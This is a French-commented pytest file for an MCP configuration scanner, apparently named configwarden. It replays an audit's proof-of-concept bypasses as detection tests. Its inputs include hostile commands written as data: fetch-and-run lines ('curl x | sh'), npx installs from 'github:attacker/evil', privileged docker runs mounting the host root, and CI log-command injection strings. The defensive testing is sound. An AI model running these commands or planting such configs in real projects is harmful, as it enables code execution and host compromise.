"""Tests v0.4.0 : constats de la revue de l'Auditeur (20 octobre 2026), rejoués.

Chaque test reprend une preuve de concept de l'Auditeur. Il échouait sur le code d'avant
la correction et passe après. Les faux secrets sont assemblés à l'exécution.
"""

import json
import os
import time
from pathlib import Path

import pytest

from configwarden import ignore
from configwarden.cli import EXIT_FINDINGS, main
from configwarden.models import Finding
from configwarden.rules import ALL_RULES
from configwarden.scanner import ScanResult, scan
from tests.conftest import fake_secret

CW106 = next(rule for rule in ALL_RULES if rule.id == "CW106")


def ids_for_server(write_mcp, server: dict) -> list[str]:
    return sorted(f.rule.id for f in scan(write_mcp({"s": server})).findings)


def ids_for(write_mcp, command: str, args: list[str]) -> list[str]:
    return ids_for_server(write_mcp, {"command": command, "args": args})


CAFILE = ["--cafile", "/etc/ssl/certs/ca.pem"]

# --- 1. npx : lecture fidèle des options (gravité haute) ----------------------------------


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        ([*CAFILE, "-y", "evil-mcp-server"], ["CW102"]),
        ([*CAFILE, "-y", "github:attacker/evil-mcp"], ["CW107"]),
        (["-y", "-p", "srv@1.0.0", *CAFILE, "-p", "github:attacker/evil", "srv"], ["CW107"]),
        ([*CAFILE, "-c", "touch PWNED_BY_NPX_C"], ["CW101"]),
        (["-yc", "touch PWNED"], ["CW101"]),
        (["--call=touch PWNED"], ["CW101"]),
        # nopt lit « --browser » puis avale le « -- » placé par npx : -c redevient une option.
        (["--browser", "srv@1.0.0", "-c", "touch PWNED"], ["CW101"]),
        # Option inconnue : npx croit qu'elle prend une valeur, npm non -> c'est la commande.
        (["--future-flag", "github:attacker/evil"], ["CW107"]),
        (["--no-registry", "github:attacker/evil", "srv@1.0.0"], ["CW107"]),
        # Cas sains : rien ne doit changer.
        (["-y", "srv@1.2.3", "-c", "config.json"], []),
        (["-y", "--registry", "https://registry.example.com", "srv@1.2.3"], []),
        (["-y", "--", "srv@1.2.3", "--call", "x"], []),
    ],
)
def test_npx_options_are_read_like_npm(write_mcp, args, expected) -> None:
    assert ids_for(write_mcp, "npx", args) == expected


def test_pnpm_shell_mode_is_a_shell(write_mcp) -> None:
    assert ids_for(write_mcp, "pnpm", ["dlx", "--shell-mode", "echo hi"]) == ["CW101"]


@pytest.mark.parametrize(
    "server",
    [
        {"command": "npx", "args": ["-y", "srv@1.0.0"], "env": {"npm_config_call": "curl x | sh"}},
        {"command": "npx", "args": ["-y", "srv@1.0.0"], "env": {"NPM_CONFIG_CALL": "sh evil.sh"}},
        {"command": "env", "args": ["npm_config_call=sh evil.sh", "npx", "-y", "srv@1.0.0"]},
    ],
    ids=["env-block", "env-block-upper", "env-wrapper"],
)
def test_npm_config_call_runs_a_shell(write_mcp, server) -> None:
    assert ids_for_server(write_mcp, server) == ["CW101"]


# --- 2. docker run : formes collées (gravité haute) ---------------------------------------


@pytest.mark.parametrize(
    "args",
    [
        ["run", "-i", "--rm", "-v/:/host", "ghcr.io/org/srv:1.2.3"],
        ["run", "-iv/var/run/docker.sock:/s", "ghcr.io/org/srv:1.2.3"],
        ["run", "-v=/:/host", "ghcr.io/org/srv:1.2.3"],
        ["run", "--privileged=1", "ghcr.io/org/srv:1.2.3"],
        ["run", "--privileged=True", "ghcr.io/org/srv:1.2.3"],
        ["run", "--privileged=t", "ghcr.io/org/srv:1.2.3"],
        ["run", "--future-option", "x", "-v/:/host", "ghcr.io/org/srv:1.2.3"],  # ligne illisible
        ["run", "--future-option", "x", "--privileged=1", "ghcr.io/org/srv:1.2.3"],
    ],
)
def test_glued_docker_options_are_seen(write_mcp, args) -> None:
    assert ids_for(write_mcp, "docker", args) == ["CW106"]


@pytest.mark.parametrize("value", ["false", "0", "f", "False"])
def test_privileged_false_is_fine(write_mcp, value) -> None:
    assert ids_for(write_mcp, "docker", ["run", f"--privileged={value}", "img/srv:1.0"]) == []


# --- 4. Saut de ligne dans « command » (gravité moyenne) ---------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "npx -y srv@1.0.0\nnpx -y github:attacker/evil",
        "cd /srv\nnpx -y github:attacker/evil",
        "npx -y srv@1.0.0\r\nnpx -y github:attacker/evil",
    ],
)
def test_newline_in_command_hides_nothing(write_mcp, command) -> None:
    assert ids_for_server(write_mcp, {"command": command}) == ["CW101", "CW107"]


# --- 5. Commandes de script (gravité basse) ------------------------------------------------


def test_hash_inside_a_word_is_not_a_comment(write_mcp) -> None:
    control = "echo build; docker run --privileged -v /:/host alpine:3.20.3"
    hidden = "echo build#1; docker run --privileged -v /:/host alpine:3.20.3"
    expected = ids_for(write_mcp, "bash", ["-c", control])
    assert "CW106" in expected
    assert ids_for(write_mcp, "bash", ["-c", hidden]) == expected


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("cmd", ["/c", "call npx -y github:attacker/evil"]),
        ("cmd", ["/c", 'start "" /b npx -y github:attacker/evil']),
        ("bash", ["-c", "echo `npx -y github:attacker/evil`"]),
        ("bash", ["-c", 'echo "$(npx -y github:attacker/evil)"']),
        ("bash", ["-c", "x=$(npx -y github:attacker/evil)"]),
    ],
)
def test_commands_inside_call_or_substitutions_are_checked(write_mcp, command, args) -> None:
    assert ids_for(write_mcp, command, args) == ["CW101", "CW107"]


@pytest.mark.parametrize(
    "script",
    [
        "# start the server\nnpx -y srv",
        "echo '#'; npx -y srv",
        'echo "a # b"; npx -y srv',
        "echo a #comment; uvx other\nnpx -y srv",
    ],
)
def test_real_comments_still_work(write_mcp, script) -> None:
    findings = scan(write_mcp({"s": {"command": "bash", "args": ["-c", script]}})).findings
    messages = [f.message for f in findings if f.rule.id == "CW102"]
    assert any("'srv'" in message for message in messages)
    assert not any("'other'" in message for message in messages)


def test_too_many_commands_are_reported(write_mcp) -> None:
    script = ";".join(["true"] * 21) + "; npx -y github:attacker/evil"
    findings = scan(write_mcp({"s": {"command": "bash", "args": ["-c", script]}})).findings
    assert "CW100" in {f.rule.id for f in findings}
    assert any("could not all be checked" in f.message for f in findings)


# --- 6 et 7. Fichier d'exceptions (gravité basse) ------------------------------------------


@pytest.mark.parametrize("separator", [chr(0x1C), chr(0x85), chr(0x2028), chr(0x0B), chr(0x0C)])
def test_hidden_line_breaks_are_refused(tmp_path, separator) -> None:
    text = "# Exceptions: none for now" + separator + "CW106 mcp.json -- reviewed\n"
    parsed = ignore.parse(text, ".configwarden-ignore", [rule.id for rule in ALL_RULES])
    assert parsed.entries == []
    [error] = parsed.errors
    assert "line 1" in error and "invalid character" in error


def test_secret_written_in_a_reason_is_masked(tmp_path, capsys) -> None:
    secret = fake_secret("ghp_", 36)
    server = {"command": "docker", "args": ["run", "--privileged", "img/srv:1.0"]}
    (tmp_path / "mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
    (tmp_path / ".configwarden-ignore").write_text(f"CW106 mcp.json -- ok, token {secret}\n")
    # Le secret écrit dans le fichier d'exceptions est aussi signalé (CW001), masqué.
    main(["scan", str(tmp_path)])
    main(["scan", str(tmp_path), "--format", "json"])
    out = capsys.readouterr().out
    assert "Suppressed by" in out
    assert secret not in out and secret[4:20] not in out


@pytest.mark.parametrize(
    ("reason", "hidden"),
    [
        (f"token {fake_secret('Zt', 30)} for the demo", fake_secret("Zt", 30)),  # format inconnu
        (f"see https://bob:{fake_secret('pw', 18)}@git.example.com/x", fake_secret("pw", 18)),
        (f"key {fake_secret('sk-ant-api03-', 40)}", fake_secret("sk-ant-api03-", 40)),
    ],
)
def test_reasons_are_masked(reason, hidden) -> None:
    parsed = ignore.parse(f"CW106 mcp.json -- {reason}\n", ".configwarden-ignore", ["CW106"])
    [entry] = parsed.entries
    assert hidden not in entry.reason and hidden[2:14] not in entry.reason


@pytest.mark.parametrize(
    "reason",
    ["sandbox for the mcp-server-filesystem-demonstration", "reviewed in PR 1234 by the team"],
)
def test_ordinary_reasons_are_kept(reason) -> None:
    parsed = ignore.parse(f"CW106 mcp.json -- {reason}\n", ".configwarden-ignore", ["CW106"])
    assert parsed.entries[0].reason == reason


# --- 8. Lenteur avec des dossiers très profonds -------------------------------------------


def test_folder_exceptions_stay_fast_on_deep_paths() -> None:
    deep = "/".join(f"d{index}" for index in range(1_400))
    findings = [
        Finding(rule=CW106, path=f"{deep}/f{index}/mcp.json", line=1, message="m")
        for index in range(3_000)
    ]
    parsed = ignore.parse("CW106 elsewhere/ -- other folder\n", ".configwarden-ignore", ["CW106"])
    result = ScanResult(findings=findings)
    start = time.perf_counter()
    ignore.apply(result, parsed)
    assert time.perf_counter() - start < 2
    assert len(result.findings) == 3_000


# --- Journaux de GitHub Actions (non confirmé, protection officielle) ----------------------


@pytest.mark.skipif(os.name == "nt", reason="« : » est interdit dans un nom de dossier Windows")
def test_report_is_shielded_from_workflow_commands(tmp_path, capsys, monkeypatch) -> None:
    folder = tmp_path / "::group::Scan details"
    folder.mkdir()
    server = {"command": "docker", "args": ["run", "--privileged", "img/srv:1.0"]}
    (folder / "mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    assert main(["scan", str(tmp_path)]) == EXIT_FINDINGS
    lines = capsys.readouterr().out.splitlines()
    assert lines[0].startswith("::stop-commands::")
    token = lines[0].removeprefix("::stop-commands::")
    assert len(token) >= 32
    assert lines[-1] == f"::{token}::"
    # Aucune ligne du rapport ne commence par « :: », même après des espaces.
    assert not any(line.lstrip().startswith("::") for line in lines[1:-1])


def test_no_shield_outside_github_actions(tmp_path, capsys, monkeypatch) -> None:
    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
    (tmp_path / "README.md").write_text("hello\n")
    main(["scan", str(tmp_path)])
    assert "stop-commands" not in capsys.readouterr().out


@pytest.mark.skipif(os.name == "nt", reason="« : » est interdit dans un nom de dossier Windows")
def test_paths_never_start_a_line_with_command_markers(tmp_path, capsys, monkeypatch) -> None:
    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
    for name in ("::warning::x", "##vso[task.setvariable variable=a]b", "#hash", "  ::error::y"):
        folder = tmp_path / name
        folder.mkdir()
        server = {"command": "docker", "args": ["run", "--privileged", "img/srv:1.0"]}
        (folder / "mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
    main(["scan", str(tmp_path)])
    out = capsys.readouterr().out
    for line in out.splitlines():
        assert not line.lstrip().startswith(("::", "##")), line
    assert "##" not in out  # « ##vso[ » est lu par Azure Pipelines n'importe où
    assert "#\\x23vso[task.setvariable" in out  # visible, mais neutralisé


@pytest.mark.parametrize("report_format", ["json", "sarif"])
def test_machine_formats_never_carry_command_markers(tmp_path, capsys, monkeypatch, report_format):
    # Un nom de serveur piégé : « ##[…] » est lu par GitHub (et « ##vso[ » par Azure) où
    # qu'il soit dans la ligne. JSON et SARIF l'écrivent « #\u0023[ » : même contenu.
    name = "##[set-output name=ok]pwned ##vso[task.setvariable variable=a]b"
    server = {"command": "docker", "args": ["run", "--privileged", "img/srv:1.0"]}
    (tmp_path / "mcp.json").write_text(json.dumps({"mcpServers": {name: server}}))
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    main(["scan", str(tmp_path), "--format", report_format])
    out = capsys.readouterr().out
    assert "##" not in out
    report = json.loads(out)  # pas de ligne « ::stop-commands:: » : reste lisible par jq
    assert name in json.dumps(report, ensure_ascii=False)


def test_hook_runs_on_every_commit() -> None:
    hooks = Path(__file__).resolve().parents[1] / ".pre-commit-hooks.yaml"
    assert "always_run: true" in hooks.read_text(encoding="utf-8")
